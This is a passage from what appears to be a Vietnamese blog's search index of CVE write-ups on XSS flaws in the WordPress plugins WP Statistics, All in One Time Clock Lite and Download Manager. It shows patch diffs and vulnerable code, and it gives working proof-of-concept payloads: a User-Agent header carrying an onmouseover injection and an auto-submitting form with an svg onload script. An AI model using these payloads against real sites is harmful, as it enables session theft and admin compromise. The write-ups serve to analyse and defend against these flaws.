thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√° V√† code thay ƒë·ªïi trong UserAgent.php{: .filepath} l√†m t√¥i tin r·∫±ng l·ªó h·ªóng th·ª±c s·ª± x·∫£y ra ·ªü ƒë√¢y. Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong UserAgent.php N√≥ l√†m t√¥i t·ªën kh√° nhi·ªÅu th·ªùi gian nh∆∞ng ch∆∞a th·ªÉ ph√¢n t√≠ch ƒë∆∞·ª£c. Tuy nhi√™n, vi·ªác n√†y c≈©ng gi√∫p √≠ch cho qu√° tr√¨nh ph√¢n t√≠ch. üçÄ May m·∫Øn thay, d∆∞·ªõi s·ª± h∆∞·ªõng d·∫´n c·ªßa c√°c ti·ªÅn b·ªëi, t√¥i ƒë√£ focus v√†o ƒë√∫ng v√†o v·ªã tr√≠ l·ªó h·ªïng. N√™n qu√° tr√¨nh ph√¢n t√≠ch tr·ªü n√™n d·ªÖ d√†ng h∆°n. Tip: ƒê√¢y l√† l·ªó h·ªïng Cross Site Script di·ªÖn ra ·ªü tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n n√™n ta c·∫ßn t√¨m n∆°i render v√† tr·∫£ v·ªÅ HTML. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rL·ªó h·ªïng x·∫£y ra trong file includes/admin/templates/pages/devices/models.php{: .filepath} t·∫°i d√≤ng 31. Trong phi√™n b·∫£n vulnerable, $item-\u003emodel ƒë∆∞·ª£c in ra HTML nh∆∞ng kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá n√†o \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e Trong phi√™n b·∫£n patched, $item-\u003emodel ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng c√°ch ƒë·∫∑t n√≥ v√†o esc_attr() v√† esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho $item-\u003emodel, ƒë·∫£m b·∫£o n√≥ s·∫Ω ƒë∆∞·ª£c escape tr∆∞·ªõc khi in ra HTML. Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong models.php ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\r\u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e N·∫øu $data kh√¥ng r·ªóng th√¨ duy·ªát qua $data v√† hi·ªÉn th·ªã d·ªØ li·ªáu ƒë√£ th·ªëng k√™ c·ªßa visitors, bao g·ªìm model. N·∫øu r·ªóng th√¨ in ra No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; } return false; } public static function unknownToNotSet($value) { if (self::isUnknown($value)) { return __('(not set)', 'wp-statistics'); } return $value; } unknownToNotSet() s·∫Ω tr·∫£ v·ªÅ (not set) n·∫øu $item-\u003emodel r·ªóng, Unknown, Unknown theo t·ª´ng ng√¥n ng·ªØ. __(\"Unknown\", 'wp-statistics') s·∫Ω t√¨m b·∫£n d·ªãch c·ªßa Unknown trong file d·ªãch .po/.mo c·ªßa text domain wp-statistics üëâ Kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá $item-\u003emodel $data kh√¥ng ƒë∆∞·ª£c kh·ªüi t·∫°o trong file n√†y n√™n ch·∫Øc ch·∫Øn r·∫Øng n√≥ ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ n∆°i kh√°c v√† models.php{: .filepath} s·∫Ω s·ª≠ d·ª•ng n√≥ khi ƒë∆∞·ª£c include. Ta c√≥ th·ªÉ search b·∫±ng t·ª´ kh√≥a models.php ƒë·ªÉ t√¨m ƒë·∫øn n∆°i g·ªçi ƒë·∫øn n√≥, nh∆∞ng ·ªü ƒë√¢y n√≥ ƒë∆∞·ª£c include ƒë·ªông. Thay v√†o ƒë√≥, ta search v·ªõi t√™n th∆∞ m·ª•c ch·ª©a n√≥ pages/devices. Diff ‚Äî C√°ch c√°c template ƒë∆∞·ª£c g·ªçi ƒë·ªông üëâ models.php{: .filepath} s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªông trong h√†m render() c·ªßa class TabsView class TabsView extends BaseTabView { public function render() { $currentTab = $this-\u003egetCurrentTab(); $data = $this-\u003egetTabData(); $args = [ 'title' =\u003e esc_html__('Devices', 'wp-statistics'), 'pageName' =\u003e Menus::get_page_slug('devices'), 'paged' =\u003e Admin_Template::getCurrentPaged(), 'custom_get' =\u003e ['tab' =\u003e $currentTab], 'data' =\u003e $data, 'viewMoreUrlArgs' =\u003e ['type' =\u003e 'single-' . rtrim($currentTab, 's'), 'from' =\u003e Request::get('from'), 'to' =\u003e Request::get('to')], 'tabs' =\u003e [ [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'overview']), 'title' =\u003e esc_html__('Overview', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'browsers']), 'title' =\u003e esc_html__('Browsers', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'platforms']), 'title' =\u003e esc_html__('Operating Systems', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'models']), 'title' =\u003e esc_html__('Device Models', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'categories']), 'title' =\u003e esc_html__('Device Categories', 'wp-statistics'), ] ], ]; Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', \"pages/devices/$currentTab\", 'layout/postbox.hide', 'layout/footer'], $args); } } C√≥ s·ª± t∆∞∆°ng quan gi·ªØa c√°c gi√° tr·ªã trong $args v√† submenu Devices Diff ‚Äî S·ª± t∆∞∆°ng quan gi·ªØa c√°c gi√° tr·ªã trong $args v√† submenu Devices Gi√° tr·ªã tab trong args s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi param tab tr√™n URL =\u003e Ph·∫°m vi truy v·∫øt n·∫±m trong submenu Devices c·ªßa admin panel. Ta c·∫ßn x√°c ƒë·ªãnh $currentTab ƒë·ªÉ bi·∫øt c√°ch render() g·ªçi ƒë·∫øn models.php{: .filepath} v√† $data ƒë·ªÉ inject payload. Bi·∫øn $currentTab // $currentTab = $this-\u003egetCurrentTab(); protected function getCurrentTab() { return Request::get('tab', $this-\u003edefaultTab); } getCurrentTab() tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa Request::get() // $param='tab' public static function get($param, $default = false, $return = 'string') { if (empty($_REQUEST[$param])) return $default; $value = $_REQUEST[$param]; if ($return === 'string') { return sanitize_text_field($value); } if ($return === 'url') { return sanitize_url($v","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: User-Agent header (POST /wp-json/wp-statistics/v2/hit) ‚Äî DeviceDetector parse ‚Üí getModel(). Sink: includes/admin/templates/pages/devices/models.php ‚Äî echo $item-\u003emodel (kh√¥ng esc_html() / esc_attr()) ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rAttacker g·ª≠i UA ch·ª©a payload XSS trong model Model ch·ª©a payload ƒë∆∞·ª£c l∆∞u trong database Admin m·ªü tab models =\u003e payload ch·∫°y. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:4","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i request ch·ª©a XSS payload: POST /wp-json/wp-statistics/v2/hit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Linux; Android 14; Goly \"onmouseover=alert()-\" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 wp_statistics_hit=1\u0026source_type=home\u0026source_id=0\u0026search_query=\u0026signature=787b07b8979cb982ec89a4f103a68081\u0026endpoint=hit\u0026referred=\u0026page_uri=Lw%3D%3D Admin truy c·∫≠p endpoint v√† hover v√†o model ch·ª©a payload: http://localhost/wp-admin/admin.php?page=wps_devices_page\u0026tab=models Result ‚Äî PoC execution screenshot D√πng \" ƒë·ªÉ ƒë√≥ng title, t·∫°o alert() th√¥ng qua s·ª± ki·ªán onmouseover v√¨ ƒë√¢y l√† th·∫ª \u003cspan\u003e, - ƒë√πng ƒë·ªÉ n·ªëi chu·ªói trong JavaScript tr√°nh ƒë∆∞·ª£c l·ªói c√∫ ph√°p ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-9816 trong plugin WP Statistics \u003c= 14.15.4 cho ph√©p Stored XSS th√¥ng qua gi√° tr·ªã model l·∫•y t·ª´ header User-Agent. Payload ƒë∆∞·ª£c l∆∞u v√†o DB v√† hi·ªÉn th·ªã trong trang qu·∫£n tr·ªã Device Models m√† kh√¥ng escape ƒë√∫ng c√°ch. B·∫£n v√° 14.15.5 ƒë√£ th√™m esc_html()/esc_attr() khi in ra HTML. Key takeaways: Stored XSS nguy hi·ªÉm h∆°n reflected v√¨ t·ªìn t·∫°i l√¢u d√†i trong DB. D·ªØ li·ªáu ƒë·∫øn t·ª´ HTTP headers c≈©ng c·∫ßn ƒë∆∞·ª£c coi nh∆∞ input kh√¥ng tin c·∫≠y. Lu√¥n escape khi output thay v√¨ ch·ªâ sanitize khi input. Update plugin l√™n b·∫£n m·ªõi nh·∫•t ƒë·ªÉ ngƒÉn ch·∫∑n khai th√°c. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet - PortSwigger WordPress WP Statistics \u003c= 14.15.4 - CVE-2025-9816 ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng Reflected Cross-Site Scripting (XSS) trong plugin All in One Time Clock Lite cho WordPress. L·ªó h·ªïng xu·∫•t ph√°t t·ª´ tham s·ªë nonce ·ªü c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 2.0, do x·ª≠ l√Ω ƒë·∫ßu v√†o kh√¥ng ƒë·∫ßy ƒë·ªß v√† kh√¥ng escape ƒë·∫ßu ra. K·∫ª t·∫•n c√¥ng (k·ªÉ c·∫£ kh√¥ng x√°c th·ª±c) c√≥ th·ªÉ ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang; nh·ªØng script n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi n·∫°n nh√¢n th·ª±c hi·ªán h√†nh ƒë·ªông b·ªã thao t√∫ng (v√≠ d·ª•: b·∫•m v√†o m·ªôt li√™n k·∫øt). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) v√† v2.0.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rTrong phi√™n b·∫£n vulnerable, tham s·ªë nonce ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_POST m√† kh√¥ng qua b·∫•t k·ª≥ sanitization n√†o: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; Trong phi√™n b·∫£n patched, tham s·ªë nonce ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng sanitize_text_field() tr∆∞·ªõc khi s·ª≠ d·ª•ng, ngƒÉn ch·∫∑n vi·ªác ch√®n m√£ ƒë·ªôc: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho bi·∫øn nonce, ƒë·∫£m b·∫£o d·ªØ li·ªáu nh·∫≠n t·ª´ request s·∫Ω ƒë∆∞·ª£c lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm tr∆∞·ªõc khi x·ª≠ l√Ω ti·∫øp. So s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√° ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rL·ªó h·ªïng n·∫±m trong h√†m aio_time_clock_lite_js() thu·ªôc class AIO_Time_Clock_Lite_Actions trong file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=‚Äúaio-time-clock-lite-actions.php‚Äù} H√†m wp_verify_nonce() so s√°nh gi√° tr·ªã $nonce g·ª≠i t·ª´ client v·ªõi gi√° tr·ªã h·ª£p l·ªá m√† server ƒë√£ sinh ra tr∆∞·ªõc ƒë√≥ b·∫±ng h√†m wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=‚Äúaio-settings.php‚Äù} N·∫øu $nonce kh√¥ng h·ª£p l·ªá =\u003e nh·∫£y sang nh√°nh else tr·∫£ v·ªÅ JSON b√°o l·ªói ch·ª©a $nonce. Click 2 references ta th·∫•y h√†m public function aio_time_clock_lite_js() ƒë∆∞·ª£c g·ªçi l√†m callback cho c√°c action hook: H√†m aio_time_clock_lite_js() ƒë∆∞·ª£c g·∫Øn v√†o hai hook Ajax (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js(authenticated). wp_ajax_nopriv_aio_time_clock_lite_js(unauthenticated). =\u003e Focus ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: Tham s·ªë nonce l·∫•y tr·ª±c ti·∫øp t·ª´ $_POST (unauthenticated request). Sink: Gi√° tr·ªã nonce ƒë∆∞·ª£c ph·∫£n chi·∫øu l·∫°i trong echo json_encode(...). ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rG·ª≠i POST request (unauthenticated) ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi c√°c params: action=aio_time_clock_lite_js\u0026nonce=nonce_value Callback aio_time_clock_lite_js() ƒë∆∞·ª£c g·ªçi Ki·ªÉm tra gi√° tr·ªã nonce =\u003e invalid Ph·∫£n chi·∫øu gi√° tr·ªã nonce v√†o body b·∫±ng echo json_encode(...) ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:4","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o trang web ch·ª©a form submit: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e G·ª≠i link ƒë·∫øn trang web ch·ª©a form cho ng∆∞·ªùi d√πng cho d·∫∑c quy·ªÅn. Quan s√°t vi·ªác th·ª±c hi·ªán JavaScript ƒë∆∞·ª£c ti√™m. Result ‚Äî PoC execution screenshot ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-6832 trong plugin All in One Time Clock Lite \u003c= 2.0 cho ph√©p unauthenticated attacker khai th√°c Reflected XSS th√¥ng qua tham s·ªë nonce. B·∫£n v√° 2.0.1 ƒë√£ th√™m sanitize_text_field() ƒë·ªÉ l·ªçc input, ngƒÉn ch·∫∑n m√£ ƒë·ªôc ƒë∆∞·ª£c ph·∫£n chi·∫øu trong JSON response. Key takeaways: Lu√¥n sanitize v√† escape d·ªØ li·ªáu tr∆∞·ªõc khi tr·∫£ v·ªÅ response. Endpoint m·ªü cho nopriv (unauthenticated) c·∫ßn ƒë∆∞·ª£c xem x√©t c·∫©n tr·ªçng. Reflected XSS th∆∞·ªùng xu·∫•t hi·ªán khi gi√° tr·ªã input ƒë∆∞·ª£c ph·∫£n chi·∫øu tr·ª±c ti·∫øp trong output (JSON/HTML). Update plugin k·ªãp th·ªùi l√† c√°ch ƒë∆°n gi·∫£n nh·∫•t ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro. ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet ‚Äî PortSwigger WordPress All in One Time Clock Lite \u003c= 2.0 ‚Äî CVE-2025-6832 ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng trong plugin Download Manager tr∆∞·ªõc phi√™n b·∫£n 3.3.24. D·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ GET request ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o HTML attribute, reflected XSS x·∫£y ra khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n do attack cung c·∫•p. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vul) v√† v3.3.24(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file src/Admin/views/stats/history.php. B·∫£n l·ªói: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e L·∫•y GET params v√† g√°n tr·ª±c ti·∫øp v√†o href c·ªßa th·∫ª \u003ca\u003e m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =\u003e nguy c∆° reflected XSS. B·∫£n v√°: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL B·∫£n v√° ƒë√£ sanitize m·∫£ng GET params b·∫±ng sanitize_array v√† s·ª≠ d·ª•ng esc_url ƒë·ªÉ escape URL =\u003e an to√†n h∆°n. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Work?\rTa c·∫ßn t√¨m URL th·ª±c s·ª± ƒë·ªÉ inject GET params ch·ª©a XSS payload. src/Admin/views/stats/history.php ch·ª©a c√°c tag php, HTML v√† n·∫±m trong views cho th·∫•y file n√†y ƒë∆∞·ª£c include ·ªü n∆°i n√†o ƒë√≥ trong m√£ ngu·ªìn plugin. Ta t√¨m v·ªõi t·ª´ kh√≥a history.php trong th∆∞ m·ª•c plugin Search results for history.php üëâ Kh√¥ng c√≥ k·∫øt qu·∫£ n√†o kh·ªõp. Kh·∫£ nƒÉng cao n√≥ ƒë∆∞·ª£c include ƒë·ªông nh∆∞ n√†y {$file_name}.php. Ta t√¨m v·ªõi regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php ƒë∆∞·ª£c include trong src/Admin/views/stats.php URL th·ª±c s·ª± ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c khai b√°o ·ªü ƒë·∫ßu file stats.php $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; T∆∞∆°ng t·ª± history.php, stats.php c≈©ng ƒë∆∞·ª£c include ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn plugin. Nh∆∞ng kh√¥ng c·∫ßn quan t√¢m v√¨ ta ƒë√£ t√¨m ƒë∆∞·ª£c URL th·ª±c s·ª±. ƒê·ªÉ ch·∫Øc ch·∫Øn h∆°n, ta ƒë·∫∑t breakpoint t·∫°i v·ªã tr√≠ l·ªó h·ªïng trong file src/Admin/views/stats/history.php, sau ƒë√≥ b·∫Øt ƒë·∫ßu debug v√† truy c·∫≠p 